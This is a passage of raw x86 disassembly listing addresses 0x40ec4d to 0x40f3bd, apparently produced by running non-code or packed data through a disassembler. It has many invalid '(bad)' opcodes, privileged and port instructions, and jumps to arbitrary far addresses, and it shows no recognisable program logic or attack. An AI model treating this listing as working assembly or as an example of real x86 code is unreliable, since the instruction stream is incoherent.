  40ec4d:	and    al,0x86
  40ec4f:	adc    edi,DWORD PTR [edi+0x6e75e944]
  40ec55:	pushf  
  40ec56:	inc    ebx
  40ec57:	push   es
  40ec58:	cli    
  40ec59:	xchg   ebp,eax
  40ec5a:	dec    edi
  40ec5b:	xor    eax,0xb99b8df5
  40ec60:	xor    ah,BYTE PTR [edx-0x6f3d96b5]
  40ec66:	mov    ch,0x1
  40ec68:	pop    esp
  40ec69:	jp     0x40ec75
  40ec6b:	mov    bh,0xe1
  40ec6d:	add    esi,edi
  40ec6f:	or     ebp,DWORD PTR [edx+0x3e]
  40ec72:	fcom   DWORD PTR [ecx+esi*4+0x68]
  40ec76:	sub    DWORD PTR gs:[esp+esi*1+0x17],0xbdbd6748
  40ec7f:	int    0xf8
  40ec81:	jg     0x40ecc1
  40ec83:	cmp    esp,ebp
  40ec85:	dec    edi
  40ec86:	repz pop ds
  40ec88:	sub    al,BYTE PTR [edi+0x44]
  40ec8b:	ret    
  40ec8c:	and    DWORD PTR [ebp+0x9],esi
  40ec8f:	xor    eax,DWORD PTR [esi+0x1f3cb6ae]
  40ec95:	pop    es
  40ec96:	or     BYTE PTR [ebx],cl
  40ec98:	adc    esi,esi
  40ec9a:	jno    0x40ec8d
  40ec9c:	mov    ebx,eax
  40ec9e:	imul   edx,DWORD PTR [ebx],0x88e88015
  40eca4:	adc    al,BYTE PTR [edx]
  40eca6:	sub    DWORD PTR [esi+edx*8],esp
  40eca9:	retf   
  40ecaa:	mov    dh,0x4b
  40ecac:	add    al,0x82
  40ecae:	add    BYTE PTR [esi+ecx*1+0x3c8bc102],bl
  40ecb5:	dec    ebx
  40ecb6:	ret    
  40ecb7:	push   0x51369671
  40ecbc:	ret    
  40ecbd:	(bad)  
  40ecbe:	jl     0x40ec4f
  40ecc0:	add    al,0x3a
  40ecc2:	or     eax,0x404d7521
  40ecc7:	jg     0x40eced
  40ecc9:	pop    es
  40ecca:	es in  eax,dx
  40eccc:	mov    ds:0x5e42a18f,eax
  40ecd1:	push   esp
  40ecd2:	push   ecx
  40ecd4:	jmp    FWORD PTR [ecx+0xc739f33]
  40ecda:	mov    ecx,edi
  40ecdc:	lds    edx,FWORD PTR [ecx-0x42b43f3e]
  40ece2:	adc    al,0x2b
  40ece4:	xchg   edi,eax
  40ece5:	xchg   esp,eax
  40ece6:	(bad)
  40ecea:	aas    
  40eceb:	sahf   
  40ecec:	sub    BYTE PTR [edx],0xdd
  40ecef:	ss adc al,0xa4
  40ecf2:	mov    ebp,0x62b590f1
  40ecf7:	mov    ebx,DWORD PTR [ecx]
  40ecf9:	outs   dx,BYTE PTR ds:[esi]
  40ecfa:	leave  
  40ecfb:	mov    ds:0x715eecf,al
  40ed00:	or     bl,BYTE PTR [esi+0x5159e887]
  40ed06:	inc    ecx
  40ed07:	(bad)  [ecx-0x7c]
  40ed0a:	and    eax,esp
  40ed0c:	adc    ecx,DWORD PTR [edx+0x79]
  40ed0f:	sbb    ch,BYTE PTR [ebp-0x20]
  40ed12:	(bad)  
  40ed13:	out    dx,eax
  40ed14:	add    eax,0x4e277681
  40ed19:	push   esp
  40ed1a:	cmp    BYTE PTR [ecx+0x74],ch
  40ed1d:	inc    ecx
  40ed1e:	std    
  40ed1f:	pop    es
  40ed20:	sbb    al,0x21
  40ed22:	mov    edi,0xbb7b42b2
  40ed27:	sahf   
  40ed28:	mov    eax,0x38bb8c12
  40ed2d:	pop    edx
  40ed2e:	sub    DWORD PTR [ebp+0x1b],esp
  40ed31:	sub    edi,DWORD PTR [eax+ecx*8]
  40ed34:	mov    eax,ds:0xb05ecc4d
  40ed39:	push   edi
  40ed3a:	loop   0x40ed39
  40ed3c:	xor    al,0xed
  40ed3e:	dec    eax
  40ed3f:	adc    BYTE PTR [esi-0x20],dh
  40ed42:	or     al,0x40
  40ed44:	ret    0x2208
  40ed47:	orps   xmm2,XMMWORD PTR [ebx]
  40ed4a:	stos   BYTE PTR es:[edi],al
  40ed4b:	shl    DWORD PTR [ebx-0xf],cl
  40ed4e:	inc    ecx
  40ed4f:	(bad)  
  40ed52:	jecxz  0x40ed76
  40ed54:	ficom  WORD PTR [edx]
  40ed56:	jmp    0xe859:0x1a35c56a
  40ed5d:	ficom  DWORD PTR [ecx]
  40ed5f:	jae    0x40ed7a
  40ed61:	fld    DWORD PTR [ebp+0x2e1a8672]
  40ed67:	push   ebp
  40ed68:	cmp    BYTE PTR [edx],0x1
  40ed6b:	or     eax,DWORD PTR [esi-0x9591348]
  40ed71:	adc    eax,0x39d7a5a7
  40ed76:	lods   eax,DWORD PTR ds:[esi]
  40ed77:	dec    edx
  40ed78:	sbb    BYTE PTR [ecx-0x6c035813],dl
  40ed7e:	jmp    0x40ede0
  40ed80:	xchg   ecx,eax
  40ed81:	xor    eax,0x2fa2b80
  40ed86:	inc    ecx
  40ed87:	or     edx,DWORD PTR [ecx+ebx*8]
  40ed8a:	xchg   DWORD PTR [ecx],esi
  40ed8c:	xor    eax,0x382a04c5
  40ed91:	leave  
  40ed92:	clc    
  40ed93:	pushf  
  40ed94:	cmp    al,0x94
  40ed96:	xchg   esi,eax
  40ed97:	inc    esi
  40ed98:	jnp    0x40ede8
  40ed9a:	ins    BYTE PTR es:[edi],dx
  40ed9b:	in     eax,dx
  40ed9c:	es mov dl,0x9f
  40ed9f:	imul   DWORD PTR [ecx+0x1e]
  40eda2:	cdq    
  40eda3:	cmp    esi,DWORD PTR [ebx-0x53]
  40eda6:	outs   dx,BYTE PTR ds:[esi]
  40eda7:	jne    0x40ed3f
  40eda9:	in     eax,dx
  40edaa:	das    
  40edab:	and    DWORD PTR [edi],edi
  40edad:	ja     0x40ee1d
  40edaf:	cwde   
  40edb0:	pop    edi
  40edb1:	xchg   edx,eax
  40edb2:	lahf   
  40edb3:	xchg   edx,eax
  40edb4:	hlt    
  40edb5:	mov    esi,0x115e52f
  40edba:	or     al,0xeb
  40edbc:	sbb    al,0xa9
  40edbe:	out    dx,eax
  40edbf:	jbe    0x40ed80
  40edc1:	ret    0x5186
  40edc4:	or     al,0x49
  40edc6:	pop    eax
  40edc7:	xchg   ebx,eax
  40edc8:	mov    edi,0xf850d443
  40edcd:	jge    0x40edcf
  40edcf:	cld    
  40edd0:	adc    ecx,edx
  40edd2:	push   0x58c1496a
  40edd7:	(bad)  
  40edd8:	dec    ebx
  40edd9:	xchg   DWORD PTR [eax+0x88205f9],edx
  40eddf:	add    al,0xda
  40ede1:	pusha  
  40ede2:	cmp    ch,0xba
  40ede5:	popa   
  40ede6:	xor    al,ch
  40ede8:	(bad)  
  40ede9:	call   FWORD PTR [esi-0x6a132174]
  40edef:	cmc    
  40edf0:	sub    al,BYTE PTR [edi+0x7f5e86ec]
  40edf6:	sar    DWORD PTR ds:0xe7482715,1
  40edfc:	dec    ebx
  40edfd:	cmc    
  40edfe:	lahf   
  40edff:	pusha  
  40ee00:	test   eax,0xc87e10f3
  40ee05:	jmp    0x413cdb5e
  40ee0a:	mov    dh,0xbe
  40ee0c:	fst    QWORD PTR [edi+esi*1+0x14]
  40ee10:	shl    BYTE PTR [ebx+0x13],cl
  40ee13:	pop    esp
  40ee14:	xchg   edx,ebx
  40ee16:	ins    BYTE PTR es:[edi],dx
  40ee17:	stc    
  40ee18:	ror    ch,1
  40ee1a:	mov    edi,0x415a2854
  40ee20:	bound  esp,QWORD PTR [edx+0x7889a600]
  40ee26:	xlat   BYTE PTR ds:[ebx]
  40ee27:	sub    al,0x8b
  40ee29:	push   edx
  40ee2a:	add    edx,0x15a9cebc
  40ee30:	je     0x40ee33
  40ee32:	jns    0x40ee4a
  40ee34:	test   eax,0x3e100fff
  40ee39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ee3a:	push   edi
  40ee3b:	push   0xffffffd9
  40ee3d:	jbe    0x40ede7
  40ee3f:	adc    al,0x3a
  40ee41:	jl     0x40edd9
  40ee43:	push   eax
  40ee44:	or     DWORD PTR [edx],0x3271d2bc
  40ee4a:	das    
  40ee4b:	loop   0x40ee0c
  40ee4d:	std    
  40ee4e:	call   0xdff2:0x94cdce83
  40ee55:	fidivr DWORD PTR [edi+0x73]
  40ee58:	enter  0x598c,0x51
  40ee5c:	xor    BYTE PTR [eax],ch
  40ee5e:	retf   
  40ee5f:	mov    ebx,0x61560c7d
  40ee64:	adc    BYTE PTR [edi],0xe5
  40ee67:	jnp    0x40ee5d
  40ee69:	or     DWORD PTR [ebx-0xaaf5c16],0xffffffa0
  40ee70:	sub    eax,0x2237672c
  40ee75:	mov    esp,0xf3b4b7f5
  40ee7a:	jo     0x40eecf
  40ee7c:	loope  0x40eef3
  40ee7e:	fs je  0x40eee2
  40ee81:	or     eax,0x943787b5
  40ee86:	callw  0x5699
  40ee8a:	pushf  
  40ee8b:	(bad)  
  40ee8c:	out    0x17,al
  40ee8e:	outs   dx,DWORD PTR ds:[esi]
  40ee8f:	cmp    BYTE PTR [ebx-0x75],dl
  40ee92:	shl    ebx,1
  40ee94:	mov    BYTE PTR [ebx],ah
  40ee96:	(bad)  
  40ee97:	jmp    0x40ee71
  40ee99:	inc    eax
  40ee9a:	fxch   st(6)
  40ee9c:	out    dx,eax
  40ee9d:	cmp    dh,BYTE PTR [esi]
  40ee9f:	and    BYTE PTR [edi-0x416f61d6],dl
  40eea5:	push   edx
  40eea6:	ja     0x40ef20
  40eea8:	scas   al,BYTE PTR es:[edi]
  40eea9:	out    dx,eax
  40eeaa:	fisubr DWORD PTR [ebx+0x3a]
  40eead:	aam    0x88
  40eeaf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eeb0:	data16 outs dx,BYTE PTR ds:[esi]
  40eeb2:	mov    ebp,ecx
  40eeb4:	call   0x8624:0xaa4bb657
  40eebb:	adc    al,BYTE PTR [edi]
  40eebd:	pop    ds
  40eebe:	jmp    0x40ef30
  40eec0:	mov    DWORD PTR [ecx],esp
  40eec2:	rcl    DWORD PTR [ebx-0xf],0x9d
  40eec6:	les    esi,FWORD PTR [edx-0x2a]
  40eec9:	xor    esp,edi
  40eecb:	cli    
  40eecc:	cs call 0xe443abb0
  40eed2:	jmp    0xac48:0x62ea0929
  40eed9:	aaa    
  40eeda:	clc    
  40eedb:	mov    al,BYTE PTR [ebx+0x41233932]
  40eee1:	add    bl,BYTE PTR [eax]
  40eee3:	retf   0xfb0
  40eee6:	(bad)
  40eee9:	sub    bh,BYTE PTR [ebp+0x4b2406eb]
  40eeef:	fst    DWORD PTR [ebx+0x4]
  40eef2:	mov    bl,0xf7
  40eef4:	test   DWORD PTR [ebx-0x3abb647],0x7526fc6a
  40eefe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eeff:	pop    edi
  40ef00:	or     ch,dh
  40ef02:	push   ebp
  40ef03:	jmp    0x166be3f
  40ef08:	mov    al,ds:0xaf98edd6
  40ef0d:	aaa    
  40ef0e:	xlat   BYTE PTR ds:[ebx]
  40ef0f:	clc    
  40ef10:	xor    BYTE PTR [ecx-0x61bf5a1d],ch
  40ef16:	cmp    ebx,esp
  40ef18:	dec    esp
  40ef19:	js     0x40ef3d
  40ef1b:	into   
  40ef1c:	jnp    0x40ef94
  40ef1e:	cmc    
  40ef1f:	cmp    DWORD PTR [esi-0x1f],esp
  40ef22:	sbb    DWORD PTR [esi-0x1a],ebp
  40ef25:	push   cs
  40ef26:	mov    eax,0xc40cabae
  40ef2b:	cmc    
  40ef2c:	(bad)  
  40ef2d:	cs jle 0x40ef09
  40ef30:	add    ebp,DWORD PTR [ebx]
  40ef32:	xchg   ecx,eax
  40ef33:	fisubr DWORD PTR [eax-0x36974ba3]
  40ef39:	and    ebp,DWORD PTR [ebx+0x14abcc4]
  40ef3f:	cmp    eax,0x75bbde3b
  40ef44:	or     DWORD PTR [eax],ebx
  40ef46:	cmp    DWORD PTR [edi],eax
  40ef48:	je     0x40ef80
  40ef4a:	js     0x40ef6a
  40ef4c:	adc    eax,0x8f7af6de
  40ef51:	outs   dx,DWORD PTR ds:[esi]
  40ef52:	sub    DWORD PTR [ebx+0x21],0xfffffff3
  40ef56:	sbb    eax,0x2d8bfb3d
  40ef5b:	out    0xd1,eax
  40ef5d:	xchg   ebp,eax
  40ef5e:	retf   0x5f17
  40ef61:	loop   0x40efb3
  40ef63:	dec    esi
  40ef64:	icebp  
  40ef65:	ret    0x4f8b
  40ef68:	mov    ch,0x90
  40ef6a:	sub    bl,al
  40ef6c:	call   0xf7815679
  40ef71:	out    0x24,eax
  40ef73:	outs   dx,BYTE PTR ds:[esi]
  40ef74:	(bad)  
  40ef75:	jmp    0x23c54ba4
  40ef7a:	sub    BYTE PTR [eax],al
  40ef7c:	dec    ebp
  40ef7d:	mov    ss,WORD PTR [esi+0x3b]
  40ef80:	out    dx,al
  40ef81:	cld    
  40ef82:	pop    edx
  40ef83:	in     al,0xde
  40ef85:	loop   0x40efbd
  40ef87:	xor    ah,BYTE PTR [ecx-0x6d]
  40ef8a:	push   ss
  40ef8b:	mov    gs,WORD PTR [eax+0x3e]
  40ef8e:	xor    DWORD PTR [edi],ebx
  40ef90:	mov    ch,0xc0
  40ef92:	jg     0x40ef91
  40ef94:	cdq    
  40ef95:	add    ah,BYTE PTR [edx+0x5c]
  40ef98:	and    dh,BYTE PTR [ecx-0x57]
  40ef9b:	ror    BYTE PTR [ebx+0x53f558ea],1
  40efa1:	iret   
  40efa2:	lods   al,BYTE PTR ds:[esi]
  40efa3:	adc    eax,0x7c04005b
  40efa8:	lods   al,BYTE PTR ds:[esi]
  40efa9:	out    0x37,al
  40efab:	and    al,0x93
  40efad:	outs   dx,BYTE PTR ds:[esi]
  40efae:	hlt    
  40efaf:	pusha  
  40efb0:	inc    eax
  40efb1:	jmp    0xe6324c84
  40efb6:	pop    edx
  40efb7:	jnp    0x40eff9
  40efb9:	call   0x5201eb02
  40efbe:	ss mov ebp,0x65e9b1e3
  40efc4:	pushf  
  40efc5:	or     BYTE PTR [ebx+0x28f45fa1],0x7e
  40efcc:	repz sub esp,DWORD PTR [ebx-0x5ab87a9d]
  40efd3:	sbb    al,0xbe
  40efd5:	enter  0xb371,0xe
  40efd9:	loope  0x40ef61
  40efdb:	jo     0x40ef7b
  40efdd:	cmp    BYTE PTR [ecx+eax*4],ch
  40efe0:	xor    BYTE PTR [ebp+0x78],dh
  40efe3:	inc    edi
  40efe4:	pop    edx
  40efe5:	sub    BYTE PTR [ebx+0x47ee29ac],0x76
  40efec:	js     0x40f048
  40efee:	push   eax
  40efef:	(bad)  
  40eff0:	sbb    al,0x8c
  40eff2:	cmp    cl,BYTE PTR [eax+0x7b5ef697]
  40eff8:	ins    DWORD PTR es:[edi],dx
  40eff9:	inc    eax
  40effa:	pop    edx
  40effb:	fild   DWORD PTR [eax-0x14e2d611]
  40f001:	push   ebx
  40f002:	push   edx
  40f003:	inc    ebp
  40f004:	inc    esi
  40f005:	fldenv [eax]
  40f007:	jo     0x40f047
  40f009:	or     al,0x6d
  40f00b:	(bad)  
  40f00c:	loope  0x40f070
  40f00e:	sub    al,0x20
  40f010:	loopne 0x40ef98
  40f012:	push   0x9
  40f014:	fnsave [esi+0x355ed35f]
  40f01a:	stos   BYTE PTR es:[edi],al
  40f01b:	adc    eax,DWORD PTR [esi-0x2d]
  40f01e:	ins    DWORD PTR es:[edi],dx
  40f01f:	mov    al,ds:0x4dfe3deb
  40f024:	jnp    0x40f022
  40f026:	xor    eax,0xfd277f3b
  40f02b:	mov    esp,cr3
  40f02e:	xchg   esi,eax
  40f02f:	ret    
  40f030:	loope  0x40eff5
  40f032:	adc    al,0xd4
  40f034:	cmp    eax,DWORD PTR [edi]
  40f036:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f037:	inc    edi
  40f038:	sub    edx,0x5faceff3
  40f03e:	mov    cl,ah
  40f040:	adc    BYTE PTR [edi],0xb8
  40f043:	add    eax,0x10af11be
  40f048:	push   ebx
  40f049:	in     al,0x62
  40f04b:	imul   ecx,DWORD PTR [edx+eax*1-0x330d47d5],0xffffffa1
  40f053:	cs jne 0x40f014
  40f056:	lock jmp 0x3849:0x31d579a8
  40f05e:	cmc    
  40f05f:	jecxz  0x40f073
  40f061:	mov    ebp,0x6cfb08d7
  40f066:	stos   BYTE PTR es:[edi],al
  40f067:	xchg   DWORD PTR [ecx],ebx
  40f069:	push   ebp
  40f06a:	pop    ds
  40f06b:	adc    al,BYTE PTR [edi-0x41700117]
  40f071:	jecxz  0x40f0b9
  40f073:	popf   
  40f074:	repz jecxz 0x40f0a0
  40f077:	jle    0x40f0d7
  40f079:	imul   edi,ecx,0x48
  40f07c:	cmc    
  40f07d:	retf   0xc7af
  40f080:	stos   DWORD PTR es:[edi],eax
  40f081:	stos   DWORD PTR es:[edi],eax
  40f082:	adc    eax,0x26bfcda4
  40f087:	dec    esi
  40f089:	xor    eax,0xee69ac9f
  40f08e:	icebp  
  40f08f:	retf   
  40f090:	leave  
  40f091:	dec    ebx
  40f092:	push   0x3c
  40f094:	gs jae 0x40f062
  40f097:	pop    es
  40f098:	mov    cl,0xa1
  40f09a:	pop    es
  40f09b:	aad    0x1c
  40f09d:	std    
  40f09e:	cld    
  40f09f:	dec    ecx
  40f0a0:	ja     0x40f035
  40f0a2:	xchg   edi,eax
  40f0a3:	sub    eax,0x2a14b3e4
  40f0a8:	ret    
  40f0a9:	jbe    0x40f08f
  40f0ab:	push   cs
  40f0ac:	(bad)  
  40f0ad:	stc    
  40f0ae:	mov    bh,0xed
  40f0b0:	loope  0x40f03f
  40f0b2:	gs dec ecx
  40f0b4:	js     0x40f067
  40f0b6:	jns    0x40f0f0
  40f0b8:	mov    dl,0x88
  40f0ba:	sub    eax,0xb6c6d6b9
  40f0bf:	sbb    ebp,esp
  40f0c1:	(bad)  
  40f0c2:	mov    bh,0x5f
  40f0c4:	push   ss
  40f0c5:	test   eax,0x23d381ae
  40f0ca:	mov    ds:0xfa5f0ce9,al
  40f0cf:	retf   
  40f0d0:	je     0x40f081
  40f0d2:	scas   eax,DWORD PTR es:[edi]
  40f0d3:	xchg   ebx,eax
  40f0d4:	adc    al,al
  40f0d6:	rcl    DWORD PTR [ebx+edx*2-0x13],cl
  40f0da:	es in  al,0xde
  40f0dd:	xchg   ebx,eax
  40f0de:	and    BYTE PTR [ecx+0x3d43af1c],cl
  40f0e4:	out    dx,al
  40f0e5:	lock xchg edx,eax
  40f0e7:	scas   al,BYTE PTR es:[edi]
  40f0e8:	and    ebp,DWORD PTR [edx]
  40f0ea:	sar    BYTE PTR [ebp-0x10],1
  40f0ed:	ret    0x179c
  40f0f0:	imul   esi,DWORD PTR [ecx+0x2ba75b06],0x34
  40f0f7:	leave  
  40f0f8:	xor    ecx,DWORD PTR gs:[bp-0x302c]
  40f0fe:	(bad)  
  40f0ff:	mov    dl,0xe7
  40f101:	push   es
  40f102:	push   edi
  40f103:	pushf  
  40f104:	scas   al,BYTE PTR es:[edi]
  40f105:	scas   eax,DWORD PTR es:[edi]
  40f106:	push   cs
  40f107:	repz lock aad 0xf8
  40f10b:	jl     0x40f110
  40f10d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f10e:	sti    
  40f10f:	outs   dx,BYTE PTR ds:[esi]
  40f110:	adc    al,0xfa
  40f112:	or     al,0xda
  40f114:	xor    al,0x82
  40f116:	mov    bh,0x8b
  40f118:	imul   esi,DWORD PTR [edx+ebx*4-0xcfd3433],0x6f
  40f120:	cmp    DWORD PTR [ebx-0x1bd419f9],edx
  40f126:	push   ss
  40f127:	inc    ebp
  40f128:	adc    esp,DWORD PTR [esi]
  40f12a:	inc    esi
  40f12b:	sub    eax,0x7701266e
  40f130:	fwait
  40f131:	ja     0x40f125
  40f133:	(bad)  
  40f134:	jmp    0xfa7a4309
  40f139:	fisttp WORD PTR [eax]
  40f13b:	xchg   ebp,eax
  40f13c:	in     eax,0xdb
  40f13e:	bound  eax,QWORD PTR [edi+0x14fc43de]
  40f144:	scas   eax,DWORD PTR es:[edi]
  40f145:	cli    
  40f146:	add    al,bl
  40f148:	fild   DWORD PTR [esi-0x3d]
  40f14b:	int    0xbe
  40f14d:	sbb    al,0x8
  40f14f:	fsub   st(5),st
  40f151:	imul   ecx,DWORD PTR [esi+0x1],0x48
  40f155:	rcr    ebp,1
  40f157:	inc    eax
  40f158:	(bad)  
  40f159:	mov    ch,0xa6
  40f15b:	or     eax,0x776909d3
  40f160:	adc    al,0x31
  40f162:	mov    cl,0x99
  40f164:	inc    ecx
  40f165:	test   BYTE PTR [esi+0x5ff80b3c],0xf0
  40f16c:	pop    esp
  40f16d:	aam    0x1f
  40f16f:	push   es
  40f170:	out    0xaf,eax
  40f172:	je     0x40f1b4
  40f174:	or     BYTE PTR ds:0x71369252,ah
  40f17a:	(bad)  
  40f17b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f17c:	add    dh,0xbb
  40f17f:	mov    ds,WORD PTR [edx]
  40f181:	fstp   DWORD PTR [esi+edi*2]
  40f184:	scas   eax,DWORD PTR es:[edi]
  40f185:	gs fs mov dl,0xd1
  40f189:	mov    eax,0xa0210f27
  40f18e:	pushf  
  40f18f:	push   edx
  40f190:	or     eax,0xf8f159e4
  40f195:	inc    ebx
  40f196:	mov    ebx,0xf624e1b7
  40f19b:	push   esi
  40f19c:	into   
  40f19d:	push   0xffffffaf
  40f19f:	add    al,0x7a
  40f1a1:	das    
  40f1a2:	(bad)  
  40f1a4:	cdq    
  40f1a5:	test   BYTE PTR [ebp+0x74ed198d],bh
  40f1ab:	je     0x40f1e2
  40f1ad:	loop   0x40f1a3
  40f1af:	in     eax,0x9c
  40f1b1:	sub    BYTE PTR [esi-0x75],0xd
  40f1b5:	xchg   ecx,eax
  40f1b6:	stc    
  40f1b7:	cmp    BYTE PTR ds:0x9c94d791,al
  40f1bd:	pop    edx
  40f1be:	xchg   edx,eax
  40f1bf:	mov    ecx,gs
  40f1c1:	test   esp,esi
  40f1c3:	in     eax,dx
  40f1c4:	(bad)  
  40f1c5:	jo     0x40f1ab
  40f1c7:	inc    BYTE PTR cs:[ecx]
  40f1ca:	and    ebx,DWORD PTR [edx+0x456336ce]
  40f1d0:	scas   al,BYTE PTR es:[edi]
  40f1d1:	repz mov al,ds:0x94277ee8
  40f1d7:	pop    ss
  40f1d8:	push   ebp
  40f1d9:	cmp    ch,ah
  40f1db:	ja     0x40f232
  40f1dd:	cld    
  40f1de:	mov    eax,ds:0xb5a36f27
  40f1e3:	jb     0x40f262
  40f1e5:	mov    cl,0x9c
  40f1e7:	retf   
  40f1e8:	adc    ah,BYTE PTR [ebx+0x6c5bf04]
  40f1ee:	daa    
  40f1ef:	leave  
  40f1f0:	adc    ebx,DWORD PTR [bx+di-0x1e2b]
  40f1f5:	adc    dh,BYTE PTR [edi-0x3c6d63dc]
  40f1fb:	sub    eax,0xb9a8de23
  40f200:	(bad)  
  40f201:	(bad)  
  40f202:	sub    al,BYTE PTR [ebx]
  40f204:	mov    DWORD PTR [eax],esp
  40f206:	xor    ebx,DWORD PTR [edx]
  40f208:	jmp    0x40f1c8
  40f20a:	outs   dx,DWORD PTR es:[esi]
  40f20c:	cdq    
  40f20d:	les    esi,FWORD PTR ds:0x26edd440
  40f213:	stc    
  40f214:	int    0x3
  40f216:	cmp    dl,BYTE PTR [ecx-0x50]
  40f219:	dec    eax
  40f21a:	iret   
  40f21b:	lea    edx,[eax]
  40f21d:	add    BYTE PTR [ecx-0x66],dl
  40f220:	xor    BYTE PTR [edx],bh
  40f222:	scas   al,BYTE PTR es:[edi]
  40f223:	or     DWORD PTR [esi+0x65],ebp
  40f226:	jne    0x40f20e
  40f228:	fdivr  DWORD PTR [ebx+ebx*4+0x4d0cac23]
  40f22f:	add    al,0x5c
  40f231:	pop    ss
  40f232:	ins    DWORD PTR es:[edi],dx
  40f233:	sub    esp,DWORD PTR [edx]
  40f235:	fwait
  40f236:	std    
  40f237:	ins    BYTE PTR es:[edi],dx
  40f238:	pop    ecx
  40f239:	dec    ecx
  40f23a:	inc    esp
  40f23b:	stc    
  40f23c:	(bad)  
  40f23d:	(bad)  
  40f23e:	std    
  40f23f:	in     al,0x7
  40f241:	aas    
  40f242:	sti    
  40f243:	call   0x7df:0xd201e764
  40f24a:	jecxz  0x40f2aa
  40f24c:	mov    bh,0x72
  40f24e:	enter  0xf437,0x70
  40f252:	mov    bh,0xcd
  40f254:	pop    ss
  40f255:	fbld   TBYTE PTR [esi+0x165a3de4]
  40f25b:	jecxz  0x40f27c
  40f25d:	push   ss
  40f25e:	mov    al,0xd0
  40f260:	dec    edx
  40f261:	(bad)  
  40f263:	mov    ds:0x4cf6b128,al
  40f268:	mov    ah,0x1f
  40f26a:	out    dx,al
  40f26b:	push   ebp
  40f26c:	inc    ebx
  40f26d:	pop    ecx
  40f26e:	(bad)  
  40f270:	mov    esp,0xb080b2e7
  40f275:	mov    esp,0xfc47dcf6
  40f27a:	jbe    0x40f2a7
  40f27c:	(bad)  
  40f27d:	pop    eax
  40f27e:	and    edx,edi
  40f280:	ins    BYTE PTR es:[edi],dx
  40f281:	(bad)
  40f284:	test   BYTE PTR [ebx],ch
  40f286:	mov    esi,fs
  40f288:	sub    al,0x82
  40f28a:	or     al,0x9b
  40f28c:	ret    
  40f28d:	ret    0x4c93
  40f290:	repz test DWORD PTR gs:[eax],ebx
  40f294:	shl    cl,1
  40f296:	adc    cl,al
  40f298:	sar    BYTE PTR [edx],0x17
  40f29b:	adc    BYTE PTR [ebp-0x4067cfb5],0x26
  40f2a2:	jg     0x40f31a
  40f2a4:	test   DWORD PTR ds:0x138089f3,0xa7f2048f
  40f2ae:	or     cl,ah
  40f2b0:	dec    esi
  40f2b1:	pop    edx
  40f2b2:	test   cl,dl
  40f2b4:	icebp  
  40f2b5:	mov    ebx,0x35e96b52
  40f2ba:	add    eax,0xdc88d243
  40f2bf:	shl    BYTE PTR ss:[ebx+edi*8+0x2417af10],0xcc
  40f2c8:	inc    edx
  40f2c9:	in     eax,0xc3
  40f2cb:	(bad)  
  40f2cc:	and    dh,ah
  40f2ce:	daa    
  40f2cf:	fadd   DWORD PTR [ebx+0x55f1ad50]
  40f2d5:	fs sahf 
  40f2d7:	xor    eax,0xed0ecf7a
  40f2dc:	(bad)  
  40f2dd:	les    esp,FWORD PTR [edx-0x5401cd97]
  40f2e3:	or     al,BYTE PTR es:[ebx+0x4f]
  40f2e7:	xor    al,0x43
  40f2e9:	test   BYTE PTR [esp+esi*4+0x743dff3],0x2d
  40f2f1:	dec    ecx
  40f2f2:	sub    eax,0xffffffc7
  40f2f5:	add    DWORD PTR [ebx],eax
  40f2f7:	sbb    bl,BYTE PTR [ebp+0x7d]
  40f2fa:	jp     0x40f37b
  40f2fc:	xor    dl,BYTE PTR [ebx]
  40f2fe:	jo     0x40f29c
  40f300:	neg    BYTE PTR [ecx+0xcd7ab86]
  40f306:	and    esp,DWORD PTR [ecx+0x42dac892]
  40f30c:	xor    al,0x32
  40f30e:	ror    DWORD PTR [eax-0x6d],1
  40f311:	jb     0x40f2ab
  40f313:	cwde   
  40f314:	pusha  
  40f315:	push   cs
  40f316:	or     DWORD PTR [eax-0x7c],edi
  40f319:	mov    dh,0x7c
  40f31b:	pop    eax
  40f31c:	pop    es
  40f31d:	mov    al,0xf0
  40f31f:	adc    al,0xa5
  40f321:	dec    DWORD PTR [edi+0x49]
  40f324:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f325:	mov    al,ds:0x8bca68b8
  40f32a:	test   BYTE PTR [ebx-0x15ca22b7],bl
  40f330:	fstp   TBYTE PTR [edi]
  40f332:	or     eax,0xbb3046f0
  40f337:	into   
  40f338:	xchg   BYTE PTR [ebx-0x56],bh
  40f33b:	jp     0x40f3ad
  40f33d:	and    edi,0xffffffd8
  40f340:	dec    edx
  40f341:	(bad)  
  40f342:	js     0x40f30d
  40f344:	addr16 add esp,esp
  40f347:	pop    ecx
  40f348:	adc    DWORD PTR [esi],ebx
  40f34a:	fmul   DWORD PTR [ebx+ebp*2+0x4e]
  40f34e:	and    DWORD PTR [ecx-0x37805d54],0x380010c6
  40f358:	xor    eax,0xc4d4bb8b
  40f35d:	add    eax,0x2b3550d0
  40f362:	shr    BYTE PTR [ecx],0x88
  40f365:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f366:	daa    
  40f367:	(bad)  
  40f368:	inc    esi
  40f369:	jo     0x40f380
  40f36b:	mov    ecx,0x7b53ad2
  40f370:	mov    esi,0x542cac3f
  40f375:	sar    DWORD PTR [esi],cl
  40f377:	ins    BYTE PTR es:[edi],dx
  40f378:	mov    esp,0xfbf34c07
  40f37d:	and    BYTE PTR [ebp-0x19],dh
  40f380:	sbb    al,0xd7
  40f382:	jns    0x40f38a
  40f384:	pop    ebx
  40f385:	call   0x62c1:0x53b08c9f
  40f38c:	popa   
  40f38d:	mov    al,ds:0x2cca6b9e
  40f392:	test   al,0xb1
  40f394:	mov    dl,0xc7
  40f396:	cmp    al,0x48
  40f398:	push   eax
  40f399:	lods   eax,DWORD PTR ds:[esi]
  40f39a:	sbb    DWORD PTR ds:0x9bbd06a2,ebp
  40f3a0:	hlt    
  40f3a1:	push   edx
  40f3a2:	pop    ds
  40f3a3:	out    0x6d,eax
  40f3a5:	push   es
  40f3a6:	lods   al,BYTE PTR ds:[esi]
  40f3a7:	jns    0x40f417
  40f3a9:	xor    al,BYTE PTR [ebp-0x40c02bcb]
  40f3af:	loop   0x40f342
  40f3b1:	or     DWORD PTR [ecx],ebx
  40f3b3:	jno    0x40f343
  40f3b5:	jae    0x40f3fe
  40f3b7:	mov    al,ds:0x9f735c21
  40f3bc:	pop    ds
  40f3bd:	add    eax,0x484b4771
